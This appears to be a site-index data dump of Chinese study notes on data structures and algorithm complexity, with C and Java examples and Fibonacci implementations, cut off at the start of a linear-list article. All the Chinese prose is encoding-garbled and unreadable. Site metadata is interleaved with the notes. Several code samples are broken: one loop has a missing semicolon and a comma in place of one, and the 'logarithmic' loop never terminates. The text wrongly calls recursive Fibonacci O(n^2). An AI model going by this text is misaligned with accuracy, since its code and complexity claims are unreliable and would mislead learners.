é¡ºåºå­å¨ç»æåå©æ°æ®å¨å­å¨å¨ä¸­çç¸å¯¹ä½ç½®æ¥è¡¨ç¤ºé»è¾å³ç³»ã\n\n * é¾å¼å­å¨ç»æ\n   \n   é¡ºåºå­å¨ç»æè¦æ±ææçå­å¨ç©ºé´è¿ç»­ãé¾å¼å­å¨ç»ææ éå ç¨å®æ´å­å¨ç©ºé´ãæ°æ®èç¹ä¹é´éè¿æéå­æ®µè¡¨ç¤ºæ°æ®å³ç³»ã\n\n\n# æ°æ®ç±»ååæ½è±¡æ°æ®ç±»å\n\n> æ°æ®ç±»åï¼DTï¼ï¼é«çº§ç¨åºè®¾è®¡æ¨è¨çä¸ä¸ªåºæ¬æ¦å¿µã\n> \n> æ½è±¡æ°æ®ç±»åï¼ADTï¼ï¼æ½è±¡åºå®éé®é¢çæ¬è´¨ãåå«ä¸é¨åï¼æ°æ®å¯¹è±¡ãæ°æ®å¯¹è±¡ä¸å³ç³»çéåãæ°æ®å¯¹è±¡çåºæ¬æä½éåã\n\nå®ä¹æ ¼å¼å¦ä¸ï¼\n\nADT æ½è±¡æ°æ®ç±»åå{\n\tæ°æ®å¯¹è±¡ï¼\n\tæ°æ®å³ç³»ï¼\n\tåºæ¬æä½ï¼åºæ¬æä½åï¼åæ°åè¡¨ï¼\n\t\t\t\t\t\tåå§æ¡ä»¶ï¼\n\t\t\t\t\t\tæä½ç»æï¼\n}ADT æ½è±¡æ°æ®ç±»åå\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ½è±¡æ°æ®ç±»åçè¡¨ç¤ºä¸å®ç°\n\nä½¿ç¨ä»äºä¼ªä»£ç åCè¯­è¨ä¹é´çç±»Cè¯­è¨ä½ä¸ºåç»­çæè¿°å·¥å·ãå·ä½è¯­æ³ä¸å¨èµè¿°ã\n\nä»¥ä¸æ¯ä»¥å¤æ°ä¸ºä¾ï¼ç»åºçä¸ä¸ªå®æ´çæ½è±¡æ°æ®ç±»åçå®ä¹ãè¡¨ç¤ºåå®ç°ã\n\nå®ä¹ï¼\n\n\n\nè¡¨ç¤ºï¼\n\n\n\nå®ç°ï¼\n\n\n\n\n# ç®æ³åç®æ³åæ\n\n\n# ç®æ³çå®ä¹\n\n> ç®æ³æ¯ä¸ºäºè§£å³æç±»é®é¢èè§å®çæéé¿åº¦çæä½åºåã\n\nç®æ³å¿é¡»æ»¡è¶³å¦ä¸çäºä¸ªç¹æ§ï¼\n\n * æç©·æ§ï¼ç®æ³å¿é¡»å¨æ§è¡æç©·æ­¥æ°åç»æ\n * ç¡®å®æ§ï¼å¯¹äºæ¯ç§æåµä¸çæä½ï¼ä¸ä¼äº§çäºä¹æ§\n * å¯è¡æ§ï¼ç®æ³ä¸­çæææä½é½å¯ä»¥éè¿å·²ç»å®ç°çæä½è¿ç®çæéæ¬¡æä½å®æ\n * è¾å¥ï¼ä¸ä¸ªç®æ³æ0ä¸ªæå¤ä¸ªè¾å¥\n * è¾åºï¼ä¸ä¸ªç®æ³æä¸ä¸ªæå¤ä¸ªè¾åº\n\n\n# ç®æ³çè¯ä»·æ å\n\n> ç®æ³åæå¹¶éç²¾ç¡®ç»è®¡ç®æ³çå®éæ§è¡æ¶é´ï¼èæ¯éå¯¹ç®æ³çæ§è¡æ¬¡æ°è¿è¡ä¼°è®¡ã\n\nç®æ³çè¯ä»·åå«ä»¥ä¸çå ä¸ªç»´åº¦ï¼\n\n * æ­£ç¡®æ§ï¼å¨åççæ°æ®è¾å¥ä¸ï¼æ»è½å¾å°æ­£ç¡®çç»æ\n * å¯è¯»æ§ï¼ä¾¿äºçè§£\n * å¥å£®æ§ï¼è¾å¥éæ³æ°æ®ï¼å¯ä»¥ææçå¤ç\n * é«ææ§ï¼åå«æ¶é´åç©ºé´ä¸¤ä¸ªç»´åº¦\n\n\n# æ¶é´å¤æåº¦\n\n> è¡¡éç®æ³æççä¸¤ç§æ¹å¼ï¼äºåç»è®¡æ³åäºååææ³ãäºåç»è®¡æ³éè¦å®ç°ç®æ³å¹¶æ§è¡ï¼è®¡ç®æ¶é´åç©ºé´çå¼éãè¿ç§æ¹æ³å­å¨ä¸¤ä¸ªå¼ç«¯ï¼å¿é¡»å®ç°ãç¡¬ä»¶ä¾èµã\n\n# é®é¢è§æ¨¡åè¯­å¥é¢åº¦\n\né®é¢è§æ¨¡æ¯ç®æ³æ±è§£é®é¢è¾å¥éçå¤å°ï¼éå¸¸ç¨ nè¡¨ç¤ºã\n\nè¯­å¥é¢åº¦æ¯ä¸æ¡è¯­å¥éå¤æ§è¡çæ¬¡æ°ã\n\n# æ¶é´å¤æåº¦çå®ä¹\n\nä¸è¬æåµä¸ï¼ç®æ³ä¸­çåºæ¬è¯­å¥éå¤æ§è¡çæ¬¡æ°æ¯é®é¢è§æ¨¡nçæä¸ªå½æ°f(n)ï¼ç®æ³çæ¶é´éå¯ä»¥è¡¨ç¤ºä¸ºï¼\n\nT(n) = O(f(n))\n\n\n1\n\n\néçé®é¢è§æ¨¡nçéæ¸å¢å¤§ï¼ç®æ³çæ§è¡æ¶é´çå¢é¿çåf(n)çå¢é¿çç¸åï¼ç§°ä¸ºç®æ³çæ¸è¿æ¶é´å¤æåº¦ï¼ç®ç§°ä¸ºæ¶é´å¤æåº¦ã\n\nå³äºæ°å­¦ç¬¦å·Oçä¸¥æ ¼å®ä¹ï¼\n\nè¥T(n)åf(n)æ¯å®ä¹å¨æ­£æ´æ°éåä¸çä¸¤ä¸ªå½æ°ï¼åT(n)åO(f(n))è¡¨ç¤ºå­å¨æ­£çå¸¸æ°Cån0ï¼ä½¿å¾å½n>= n0æ¶ï¼é½æ»¡è¶³0<=T(n)<=Cf(n).\n\n\n1\n\n\næ²¡å¿è¦çº ç»è¿ä¸ªä¸¥æ ¼çå®ä¹æ¹å¼ï¼åªéè¦å¦ä½è¿è¡è®¡ç®å³å¯ãä»¥ä¸æ¯å¸¸è§çæ¶é´å¤æåº¦ï¼\n\n// å¸¸éå¤æåº¦ O(1)\n{\n  x++;\n  s=0;\n}\n\n// çº¿æ§é¶å¤æåº¦O(n)\nfor(i=0;i<n;i++){\n  x++;\n  s=0;\n}\n\n// å¹³æ¹é¶O(n2)\nx = 0;y = 0;\nfor(i=0;i<ni++){\n  for(j=0,j<n;j++){\n    printf("hello\\n");\n  }\n}\n\n// å¯¹æ°é¶O(log2n)\nfor(i=0;i<n;i+=i){\n  x++;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¸¸è§çæ¶é´å¤æåº¦æç§æ°éçº§éå¢æåä¸ºï¼\n\nO(1) < O(log2n) < O(n) < O(nlog2n) < O(n^2) < O(n^3) < â¦â¦ < O(n^k) < O(2^n)\n\n\n1\n\n\n# æå¥½æåæ¶é´å¤æåº¦\n\nç®æ³å¨æå¥½æåµä¸çæ¶é´å¤æåº¦ç§°ä¸ºæå¥½æ¶é´å¤æåº¦ï¼æçæ¯ç®æ³è®¡ç®éå¯è½è¾¾å°çæå°å¼ï¼ç®æ³å¨æåæåµä¸çæ¶é´å¤æåº¦ç§°ä¸º æåæ¶é´å¤æåº¦ï¼æçæ¯ç®æ³è®¡ç®éè¾¾å°çæå¤§å¼ãç®æ³ç å¹³åæ¶é´å¤æåº¦æçæ¯ç®æ³å¨æææåµä¸çè®¡ç®éçå æå¹³åã\n\n# ç®æ³ç©ºé´å¤æåº¦\n\nä¸è¬æåµä¸ï¼ä¸ä¸ªç¨åºå¨æºå¨ä¸æ§è¡ï¼é¤äºéè¦å¯å­æ¬èº«çæä»¤ãå¸¸æ°ãåéãè¾å¥æ°æ®æå¤ï¼è¿éè¦ä¸äºéæ°æ®è¿è¡æä½çè¾å©ç©ºé´ãå¦æç®æ³æ§è¡æ¶æéè¦çè¾å©ç©ºé´å¯¹äºè¾å¥éèè¨æ¯å¸¸æ°ï¼ç§°ä¸º åå°å·¥ä½ï¼è¾å©ç©ºé´ä¸º O(1)ã\n\n\n# ææ³¢é£å¥æ°å\n\nææ³¢é£å¥æ° ï¼éå¸¸ç¨ F(n) è¡¨ç¤ºï¼å½¢æçåºåç§°ä¸º ææ³¢é£å¥æ°å ãè¯¥æ°åç± 0 å 1 å¼å§ï¼åé¢çæ¯ä¸é¡¹æ°å­é½æ¯åé¢ä¸¤é¡¹æ°å­çåãä¹å°±æ¯ï¼\n\nF(0) = 0ï¼F(1) = 1\nF(n) = F(n - 1) + F(n - 2)ï¼å¶ä¸­ n > 1\n\n\n1\n2\n\n\nè¯¥é¢æä¸¤ç§ç®æ³ï¼éå½åè¿­ä»£ã\n\néå½ç®æ³ï¼æ¶é´å¤æåº¦ä¸ºO(n^2)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}\n\n\n1\n2\n3\n4\n\n\nè¿­ä»£ç®æ³ï¼æ¶é´å¤æåº¦ä¸ºO(n)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n\n  int first = 0;\n  int second = 1;\n\n  for (int i = 0; i < n - 1; i++) {\n    int sum = first + second;\n    first = second;\n    second = sum;\n  }\n  return second;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',normalizedContent:'# ãæ°æ®ç»æãæ¦è¿°\n\nç¬è®°\n\nåºç¡ä¸ç¢åºï¼ææåºç¡å§ã\n\n\n# æ¯è¯­åæ¦å¿µ\n\n\n# æ°æ®ãæ°æ®åç´ ãæ°æ®é¡¹ãæ°æ®å¯¹è±¡\n\n * æ°æ®ï¼å®¢è§äºç©çç¬¦å·è¡¨ç¤ºï¼ææè½å¤è¾å¥å°è®¡ç®æºä¸­å¹¶å¯ä»¥è¢«è®¡ç®æºç¨åºå¤ççç¬¦å·çæ»ç§°ãæ¯å¦ï¼å­ç¬¦ä¸²ãå¾åãå£°é³ç­ã\n * æ°æ®åç´ ï¼æ°æ®çåºæ¬åä½ãæ°æ®åç´ ä¹ç§°ä¸ºåç´ ãè®°å½ãå¯ä»¥çè§£ä¸ºæ°æ®åºçä¸æ¡è®°å½ã\n * æ°æ®é¡¹ï¼ç»ææ°æ®åç´ çãæç¬ç«å«ä¹çãä¸å¯åå²çæå°åä½ãå¯ä»¥çè§£ä¸ºæ°æ®åºçæä¸åã\n * æ°æ®å¯¹è±¡ï¼æ§è´¨ç¸åçæ°æ®åç´ çéåãæ¯æ°æ®çå­éãå¯ä»¥çè§£ä¸ºæ°æ®åºçä¸å¼ è¡¨ã\n\n\n# æ°æ®ç»æ\n\n> æ°æ®ç»ææ¯ç¸äºä¹é´å­å¨çä¸ç§æèå¤ç§ç¹å®å³ç³»çæ°æ®åç´ çéåã\n> \n> æ°æ®ç»ææ¯å¸¦ç»æçæ°æ®åç´ çéåï¼ç»ææ¯æ°æ®ä¹é´çå³ç³»ã\n\n# 1. é»è¾ç»æ\n\næ°æ®çé»è¾ç»ææ¯ä» é»è¾å³ç³»ä¸æè¿°æ°æ®ï¼åæ°æ®çå­å¨æ å³ãå¯ä»¥çä½æ¯ä»å·ä½é®é¢ä¸­æ½è±¡åºæ¥çæ°å­¦æ¨¡åãé»è¾ç»æçä¸¤ä¸ªè¦ç´ ï¼æ°æ®åç´ ãå³ç³»ãéå¸¸å­å¨ä»¥ä¸åç§æ°æ®çé»è¾ç»æï¼\n\n * éåç»æ\n   \n   æ°æ®åç´ ä¹é´é¤äºå±äºåä¸ä¸ªéåä¹å¤ï¼æ å¶ä»å³ç³»ãä¾å¦ï¼å­¦çå±äºä¸ä¸ªç­çº§ã\n   \n   \n\n * çº¿æ§ç»æ\n   \n   æ°æ®ä¹é´å­å¨ä¸å¯¹ä¸çå³ç³»ãä¾å¦ï¼æéåç³è«è¦ã\n   \n   \n\n * æ ç»æ\n   \n   æ°æ®ä¸­å­å¨ä¸å¯¹å¤çå³ç³»ãä¾å¦ï¼æè°±ãç»ç»ç»æç­ã\n   \n   \n\n * å¾ç»æ\n   \n   æ°æ®ä¹é´å­å¨å¤å¯¹å¤çå³ç³»ãå¦ï¼äººç©å³ç³»å¾ã\n   \n   \n\n> éåãæ ãå¾é½å±äºéçº¿æ§ç»æã\n> \n> çº¿æ§ç»æåå«ï¼çº¿æ§è¡¨ãæ ãéåãå­ç¬¦ä¸²ãæ°æ®ãå¹¿ä¹è¡¨ç­ã\n> \n> éçº¿æ§ç»æåå«ï¼æ ãäºåæ ãæåå¾åæ åå¾ã\n\n\n\n# 2. å­å¨ç»æ\n\n> æ°æ®å¯¹è±¡å¦ä½å­å¨å¨è®¡ç®æºä¸­ï¼ç§°ä¸ºæ°æ®çå­å¨ç»æãä¹å« ç©çç»æãå¨æ°æ®å­å¨å°è®¡ç®æºæ¶ï¼æ¢è¦å­å¨åç´ ä¹è¦å­å¨å³ç³»ãæ°æ®åç´ å¨è®¡ç®æºä¸­æä¸¤ç§åºæ¬çå­å¨ç»æï¼é¡ºåºå­å¨ç»æåé¾å¼å­å¨ç»æã\n\n * é¡ºåºå­å¨ç»æ\n   \n   é¡ºåºå­å¨ç»æåå©æ°æ®å¨å­å¨å¨ä¸­çç¸å¯¹ä½ç½®æ¥è¡¨ç¤ºé»è¾å³ç³»ã\n\n * é¾å¼å­å¨ç»æ\n   \n   é¡ºåºå­å¨ç»æè¦æ±ææçå­å¨ç©ºé´è¿ç»­ãé¾å¼å­å¨ç»ææ éå ç¨å®æ´å­å¨ç©ºé´ãæ°æ®èç¹ä¹é´éè¿æéå­æ®µè¡¨ç¤ºæ°æ®å³ç³»ã\n\n\n# æ°æ®ç±»ååæ½è±¡æ°æ®ç±»å\n\n> æ°æ®ç±»åï¼dtï¼ï¼é«çº§ç¨åºè®¾è®¡æ¨è¨çä¸ä¸ªåºæ¬æ¦å¿µã\n> \n> æ½è±¡æ°æ®ç±»åï¼adtï¼ï¼æ½è±¡åºå®éé®é¢çæ¬è´¨ãåå«ä¸é¨åï¼æ°æ®å¯¹è±¡ãæ°æ®å¯¹è±¡ä¸å³ç³»çéåãæ°æ®å¯¹è±¡çåºæ¬æä½éåã\n\nå®ä¹æ ¼å¼å¦ä¸ï¼\n\nadt æ½è±¡æ°æ®ç±»åå{\n\tæ°æ®å¯¹è±¡ï¼\n\tæ°æ®å³ç³»ï¼\n\tåºæ¬æä½ï¼åºæ¬æä½åï¼åæ°åè¡¨ï¼\n\t\t\t\t\t\tåå§æ¡ä»¶ï¼\n\t\t\t\t\t\tæä½ç»æï¼\n}adt æ½è±¡æ°æ®ç±»åå\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ½è±¡æ°æ®ç±»åçè¡¨ç¤ºä¸å®ç°\n\nä½¿ç¨ä»äºä¼ªä»£ç åcè¯­è¨ä¹é´çç±»cè¯­è¨ä½ä¸ºåç»­çæè¿°å·¥å·ãå·ä½è¯­æ³ä¸å¨èµè¿°ã\n\nä»¥ä¸æ¯ä»¥å¤æ°ä¸ºä¾ï¼ç»åºçä¸ä¸ªå®æ´çæ½è±¡æ°æ®ç±»åçå®ä¹ãè¡¨ç¤ºåå®ç°ã\n\nå®ä¹ï¼\n\n\n\nè¡¨ç¤ºï¼\n\n\n\nå®ç°ï¼\n\n\n\n\n# ç®æ³åç®æ³åæ\n\n\n# ç®æ³çå®ä¹\n\n> ç®æ³æ¯ä¸ºäºè§£å³æç±»é®é¢èè§å®çæéé¿åº¦çæä½åºåã\n\nç®æ³å¿é¡»æ»¡è¶³å¦ä¸çäºä¸ªç¹æ§ï¼\n\n * æç©·æ§ï¼ç®æ³å¿é¡»å¨æ§è¡æç©·æ­¥æ°åç»æ\n * ç¡®å®æ§ï¼å¯¹äºæ¯ç§æåµä¸çæä½ï¼ä¸ä¼äº§çäºä¹æ§\n * å¯è¡æ§ï¼ç®æ³ä¸­çæææä½é½å¯ä»¥éè¿å·²ç»å®ç°çæä½è¿ç®çæéæ¬¡æä½å®æ\n * è¾å¥ï¼ä¸ä¸ªç®æ³æ0ä¸ªæå¤ä¸ªè¾å¥\n * è¾åºï¼ä¸ä¸ªç®æ³æä¸ä¸ªæå¤ä¸ªè¾åº\n\n\n# ç®æ³çè¯ä»·æ å\n\n> ç®æ³åæå¹¶éç²¾ç¡®ç»è®¡ç®æ³çå®éæ§è¡æ¶é´ï¼èæ¯éå¯¹ç®æ³çæ§è¡æ¬¡æ°è¿è¡ä¼°è®¡ã\n\nç®æ³çè¯ä»·åå«ä»¥ä¸çå ä¸ªç»´åº¦ï¼\n\n * æ­£ç¡®æ§ï¼å¨åççæ°æ®è¾å¥ä¸ï¼æ»è½å¾å°æ­£ç¡®çç»æ\n * å¯è¯»æ§ï¼ä¾¿äºçè§£\n * å¥å£®æ§ï¼è¾å¥éæ³æ°æ®ï¼å¯ä»¥ææçå¤ç\n * é«ææ§ï¼åå«æ¶é´åç©ºé´ä¸¤ä¸ªç»´åº¦\n\n\n# æ¶é´å¤æåº¦\n\n> è¡¡éç®æ³æççä¸¤ç§æ¹å¼ï¼äºåç»è®¡æ³åäºååææ³ãäºåç»è®¡æ³éè¦å®ç°ç®æ³å¹¶æ§è¡ï¼è®¡ç®æ¶é´åç©ºé´çå¼éãè¿ç§æ¹æ³å­å¨ä¸¤ä¸ªå¼ç«¯ï¼å¿é¡»å®ç°ãç¡¬ä»¶ä¾èµã\n\n# é®é¢è§æ¨¡åè¯­å¥é¢åº¦\n\né®é¢è§æ¨¡æ¯ç®æ³æ±è§£é®é¢è¾å¥éçå¤å°ï¼éå¸¸ç¨ nè¡¨ç¤ºã\n\nè¯­å¥é¢åº¦æ¯ä¸æ¡è¯­å¥éå¤æ§è¡çæ¬¡æ°ã\n\n# æ¶é´å¤æåº¦çå®ä¹\n\nä¸è¬æåµä¸ï¼ç®æ³ä¸­çåºæ¬è¯­å¥éå¤æ§è¡çæ¬¡æ°æ¯é®é¢è§æ¨¡nçæä¸ªå½æ°f(n)ï¼ç®æ³çæ¶é´éå¯ä»¥è¡¨ç¤ºä¸ºï¼\n\nt(n) = o(f(n))\n\n\n1\n\n\néçé®é¢è§æ¨¡nçéæ¸å¢å¤§ï¼ç®æ³çæ§è¡æ¶é´çå¢é¿çåf(n)çå¢é¿çç¸åï¼ç§°ä¸ºç®æ³çæ¸è¿æ¶é´å¤æåº¦ï¼ç®ç§°ä¸ºæ¶é´å¤æåº¦ã\n\nå³äºæ°å­¦ç¬¦å·oçä¸¥æ ¼å®ä¹ï¼\n\nè¥t(n)åf(n)æ¯å®ä¹å¨æ­£æ´æ°éåä¸çä¸¤ä¸ªå½æ°ï¼åt(n)åo(f(n))è¡¨ç¤ºå­å¨æ­£çå¸¸æ°cån0ï¼ä½¿å¾å½n>= n0æ¶ï¼é½æ»¡è¶³0<=t(n)<=cf(n).\n\n\n1\n\n\næ²¡å¿è¦çº ç»è¿ä¸ªä¸¥æ ¼çå®ä¹æ¹å¼ï¼åªéè¦å¦ä½è¿è¡è®¡ç®å³å¯ãä»¥ä¸æ¯å¸¸è§çæ¶é´å¤æåº¦ï¼\n\n// å¸¸éå¤æåº¦ o(1)\n{\n  x++;\n  s=0;\n}\n\n// çº¿æ§é¶å¤æåº¦o(n)\nfor(i=0;i<n;i++){\n  x++;\n  s=0;\n}\n\n// å¹³æ¹é¶o(n2)\nx = 0;y = 0;\nfor(i=0;i<ni++){\n  for(j=0,j<n;j++){\n    printf("hello\\n");\n  }\n}\n\n// å¯¹æ°é¶o(log2n)\nfor(i=0;i<n;i+=i){\n  x++;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¸¸è§çæ¶é´å¤æåº¦æç§æ°éçº§éå¢æåä¸ºï¼\n\no(1) < o(log2n) < o(n) < o(nlog2n) < o(n^2) < o(n^3) < â¦â¦ < o(n^k) < o(2^n)\n\n\n1\n\n\n# æå¥½æåæ¶é´å¤æåº¦\n\nç®æ³å¨æå¥½æåµä¸çæ¶é´å¤æåº¦ç§°ä¸ºæå¥½æ¶é´å¤æåº¦ï¼æçæ¯ç®æ³è®¡ç®éå¯è½è¾¾å°çæå°å¼ï¼ç®æ³å¨æåæåµä¸çæ¶é´å¤æåº¦ç§°ä¸º æåæ¶é´å¤æåº¦ï¼æçæ¯ç®æ³è®¡ç®éè¾¾å°çæå¤§å¼ãç®æ³ç å¹³åæ¶é´å¤æåº¦æçæ¯ç®æ³å¨æææåµä¸çè®¡ç®éçå æå¹³åã\n\n# ç®æ³ç©ºé´å¤æåº¦\n\nä¸è¬æåµä¸ï¼ä¸ä¸ªç¨åºå¨æºå¨ä¸æ§è¡ï¼é¤äºéè¦å¯å­æ¬èº«çæä»¤ãå¸¸æ°ãåéãè¾å¥æ°æ®æå¤ï¼è¿éè¦ä¸äºéæ°æ®è¿è¡æä½çè¾å©ç©ºé´ãå¦æç®æ³æ§è¡æ¶æéè¦çè¾å©ç©ºé´å¯¹äºè¾å¥éèè¨æ¯å¸¸æ°ï¼ç§°ä¸º åå°å·¥ä½ï¼è¾å©ç©ºé´ä¸º o(1)ã\n\n\n# ææ³¢é£å¥æ°å\n\nææ³¢é£å¥æ° ï¼éå¸¸ç¨ f(n) è¡¨ç¤ºï¼å½¢æçåºåç§°ä¸º ææ³¢é£å¥æ°å ãè¯¥æ°åç± 0 å 1 å¼å§ï¼åé¢çæ¯ä¸é¡¹æ°å­é½æ¯åé¢ä¸¤é¡¹æ°å­çåãä¹å°±æ¯ï¼\n\nf(0) = 0ï¼f(1) = 1\nf(n) = f(n - 1) + f(n - 2)ï¼å¶ä¸­ n > 1\n\n\n1\n2\n\n\nè¯¥é¢æä¸¤ç§ç®æ³ï¼éå½åè¿­ä»£ã\n\néå½ç®æ³ï¼æ¶é´å¤æåº¦ä¸ºo(n^2)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}\n\n\n1\n2\n3\n4\n\n\nè¿­ä»£ç®æ³ï¼æ¶é´å¤æåº¦ä¸ºo(n)\n\npublic int fib(int n) {\n  if (n <= 1) return n;\n\n  int first = 0;\n  int second = 1;\n\n  for (int i = 0; i < n - 1; i++) {\n    int sum = first + second;\n    first = second;\n    second = sum;\n  }\n  return second;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n',charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"ãæ°æ®ç»æãçº¿æ§è¡¨",frontmatter:{title:"ãæ°æ®ç»æãçº¿æ§è¡¨",date:"2022-05-06T23:00:00.000Z",permalink:"/dev/basic/ds/list",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","è®¡ç®æºåºç¡","æ°æ®ç»æä¸ç®æ³"],tags:["æ°æ®ç»æ","çº¿æ§è¡¨"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/102.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/1020.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/01.%E7%BA%BF%E6%80%A7%E8%A1%A8.html",relativePath:"01.å¼å/102.è®¡ç®æºåºç¡/1020.æ°æ®ç»æä¸ç®æ³/01.çº¿æ§è¡¨.md",key:"v-16c92313",path:"/dev/basic/ds/list/",headers:[{level:2,title:"å®ä¹åç¹ç¹",slug:"å®ä¹åç¹ç¹",normalizedTitle:"å®ä¹åç¹ç¹",charIndex:86},{level:2,title:"çº¿æ§è¡¨çç±»åå®ä¹",slug:"çº¿æ§è¡¨çç±»åå®ä¹",normalizedTitle:"çº¿æ§è¡¨çç±»åå®ä¹",charIndex:336},{level:2,title:"çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼Cè¯­è¨çï¼",slug:"çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°-cè¯­è¨ç",normalizedTitle:"çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼cè¯­è¨çï¼",charIndex:423},{level:3,title:"çº¿æ§è¡¨çé¡ºåºå­å¨è¡¨ç¤º",slug:"çº¿æ§è¡¨çé¡ºåºå­å¨è¡¨ç¤º",normalizedTitle:"çº¿æ§è¡¨çé¡ºåºå­å¨è¡¨ç¤º",charIndex:445},{level:3,title:"é¡ºåºè¡¨çåºæ¬æä½",slug:"é¡ºåºè¡¨çåºæ¬æä½",normalizedTitle:"é¡ºåºè¡¨çåºæ¬æä½",charIndex:1091},{level:2,title:"çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼Javaè¯­è¨çï¼",slug:"çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°-javaè¯­è¨ç",normalizedTitle:"çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼javaè¯­è¨çï¼",charIndex:3861},{level:2,title:"çº¿æ§è¡¨çé¾å¼è¡¨ç¤ºåå®ç°ï¼Javaè¯­è¨çï¼",slug:"çº¿æ§è¡¨çé¾å¼è¡¨ç¤ºåå®ç°-javaè¯­è¨ç",normalizedTitle:"çº¿æ§è¡¨çé¾å¼è¡¨ç¤ºåå®ç°ï¼javaè¯­è¨çï¼",charIndex:11833},{level:3,title:"åé¾è¡¨çå®ä¹åè¡¨ç¤º",slug:"åé¾è¡¨çå®ä¹åè¡¨ç¤º",normalizedTitle:"åé¾è¡¨çå®ä¹åè¡¨ç¤º",charIndex:11858},{level:3,title:"åé¾è¡¨çåºæ¬æä½çå®ç°",slug:"åé¾è¡¨çåºæ¬æä½çå®ç°",normalizedTitle:"åé¾è¡¨çåºæ¬æä½çå®ç°",charIndex:12468},{level:3,title:"LeetCode-åè½¬é¾è¡¨",slug:"leetcode-åè½¬é¾è¡¨",normalizedTitle:"leetcode-åè½¬é¾è¡¨",charIndex:17112},{level:3,title:"LeetCode - å¤æ­é¾è¡¨æ¯å¦æç¯",slug:"leetcode-å¤æ­é¾è¡¨æ¯å¦æç¯",normalizedTitle:"leetcode - å¤æ­é¾è¡¨æ¯å¦æç¯",charIndex:18331},{level:3,title:"LeetCode-ç§»é¤é¾è¡¨çåç´ ",slug:"leetcode-ç§»é¤é¾è¡¨çåç´ ",normalizedTitle:"leetcode-ç§»é¤é¾è¡¨çåç´ ",charIndex:19248}],excerpt:'<h1 id="çº¿æ§è¡¨"><a class="header-anchor" href="#çº¿æ§è¡¨">#</a> çº¿æ§è¡¨</h1>\n<blockquote>\n<p>çº¿æ§è¡¨åæ ãéåãä¸²ä»¥åæ°ç»é½å±äºçº¿æ§ç»æãçº¿æ§ç»æåºæ¬ç¹ç¹æ¯é¤äºç¬¬ä¸ä¸ªåç´ æ ç´æ¥åé©±ãæåä¸ä¸ªåç´ æ ç´æ¥åç»§ï¼å¶ä»æ°æ®åç´ é½æä¸ä¸ªåé©±ååç»§ã</p>\n</blockquote>\n',headersStr:"å®ä¹åç¹ç¹ çº¿æ§è¡¨çç±»åå®ä¹ çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼Cè¯­è¨çï¼ çº¿æ§è¡¨çé¡ºåºå­å¨è¡¨ç¤º é¡ºåºè¡¨çåºæ¬æä½ çº¿æ§è¡¨çé¡ºåºè¡¨ç¤ºåå®ç°ï¼Javaè¯­è¨çï¼ çº¿æ§è¡¨çé¾å¼è¡¨ç¤ºåå®ç°ï¼Javaè¯­è¨çï¼ åé¾è¡¨çå®ä¹åè¡¨ç¤º åé¾è¡¨çåºæ¬æä½çå®ç° LeetCode-åè½¬é¾è¡¨ LeetCode - å¤æ­é¾è¡¨æ¯å¦æç¯ LeetCode-ç§»é¤é¾è¡¨çåç´ ",content:'# çº¿æ§è¡¨\n\n> çº¿æ§è¡¨åæ ãéåãä¸²ä»¥åæ°ç»é½å±äºçº¿æ§ç»æãçº¿æ§ç»æåºæ¬ç¹ç¹æ¯é¤äºç¬¬ä¸ä¸ªåç´ æ ç´æ¥åé©±ãæåä¸ä¸ªåç´ æ ç´æ¥åç»§ï¼å¶ä»æ°æ®åç´ é½æä¸ä¸ªåé©±ååç»§ã\n\n\n# å®ä¹åç¹ç¹\n\nçæ´»ä¸­æå¾å¤çº¿æ§è¡¨çä¾å­ï¼æ¯å¦26ä¸ªè±æå­æ¯ãå­¦çä¿¡æ¯è¡¨ç­ç­ãä»ä»¬çæ°æ®åç´ è½ç¶ä¸ç¸åï¼ä½æ¯åä¸ä¸ªçº¿æ§è¡¨ä¸­çåç´ å¿å®æç¸åçç¹æ§ã\n\nè¯¸å¦æ­¤ç±»ç±n(n>=0)ä¸ªæ°æ®ç¹æ§ç¸åçåç´ ææçæéåºåç§°ä¸ºçº¿æ§è¡¨ãçº¿æ§è¡¨ä¸­çnç§°ä¸ºçº¿æ§è¡¨çé¿åº¦ï¼n=0æ¶åä¸ºç©ºè¡¨ã\n\néç©ºçº¿æ§è¡¨éå¸¸æå¦ä¸çç¹å¾ï¼\n\n * å­å¨ä¸ºä¸ä¸ªè¢«ç§°ä¸º ç¬¬ä¸ä¸ªçæ°æ®åç´ \n * å­å¨å¯ä¸ä¸ä¸ªè¢«ç§°ä¸º æåä¸ä¸ªçæ°æ®åç´ \n * é¤äºç¬¬ä¸ä¸ªä¹å¤ï¼æ¯ä¸ªåç´ é½æä¸åªæä¸ä¸ªåé©±\n * é¤äºæåä¸ä¸ªä¹å¤ï¼æ¯ä¸ªåç´ é½æä¸åªæä¸ä¸ªåç»§\n\n\n# 